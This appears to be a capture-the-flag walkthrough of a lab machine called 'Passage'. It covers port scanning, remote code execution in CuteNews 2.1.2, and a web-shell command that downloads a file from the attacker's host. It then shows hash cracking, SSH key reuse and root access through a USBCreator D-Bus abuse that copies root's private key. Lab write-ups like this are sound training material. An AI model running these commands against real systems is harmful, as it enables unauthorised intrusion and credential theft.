# Passage

## Enumeration

### Scan Report

```text
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port - 80 

**Dirbuster Report**

![](../../../.gitbook/assets/image%20%2893%29.png)

Cute News seems interesting.

![](../../../.gitbook/assets/image%20%2872%29.png)

**CuteNews Version: 2.1.2**

\*\*\*\*

## **Exploitation**

searchsploit cutenews

```text
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                    | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload        | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                      | php/webapps/48800.py
```

Lets run 4th Exploit

It created a user and now you can access the file in browser. 

**Uploading shell** 

```text
http://10.10.10.206/CuteNews/uploads/avatar_9vNU22mK3t_9vNU22mK3t.php?cmd=wget%20http://10.10.14.12:8000/shell2.php
```



## **Post Exploitation**

### **Full TTY**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### **Current User**

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### **LinPeas**

```bash
cd /tmp
wget htt[://10.10.14.12:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Nothing much interesting...

Search for password or csome configurations in www/html folder

```bash
find /var/www/html/CuteNews | grep -i password
find /var/www/html/CuteNews | grep -i database
find /var/www/html/CuteNews | grep -i sql
.
.
.
```

Users folder has some interesting dta which is base64 encoded

```bash
for i in $(find . -name "*.php" ); do tail -1 $i | base64 -d; echo; done;
```

Paul is a user of machine. Crack his obtained SHA2-256

```bash
hashcat -m 1400 -a 0 hash ~/PenetrationTesting/tools/rockyou.txt
```

Switch to paul from www-data

```bash
su paul
```

### User Flag

```bash
cat /home/paul/user.txt
```



### Check SSH Keys

```bash
cat /home/paul/.ssh/authorized_keys
```

![](../../../.gitbook/assets/image%20%2840%29.png)

This key is for Nadav. Generating public key to access using Nadav's account.



Download this key and login via ssh.

find usb creator reference in viminfo...



Check exploits: [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/id_rsa true
()
```

```bash
ssh-keygen -y -f id_rsa
```

This gives us the key for SSH of root. we use it and get the flag.

